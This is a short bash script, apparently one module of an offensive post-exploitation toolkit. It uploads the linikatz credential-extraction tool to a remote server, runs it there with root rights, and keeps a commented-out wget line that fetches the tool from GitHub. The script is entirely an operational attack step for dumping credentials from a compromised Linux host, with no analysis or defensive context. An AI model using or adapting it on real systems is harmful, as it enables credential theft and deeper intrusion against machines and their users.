#!/bin/bash

: '
download linikatz to server and execute (root needed)
'

# wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh -O ${SCRIPTS_DIR}/reconnaissance/linux/.files/linikatz.sh

LOCATION="${SCRIPTS_DIR}/reconnaissance/linux/.files"
FILE="linikatz.sh"

curl_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "bash ${FILE_LOCATION}"
create_new_line
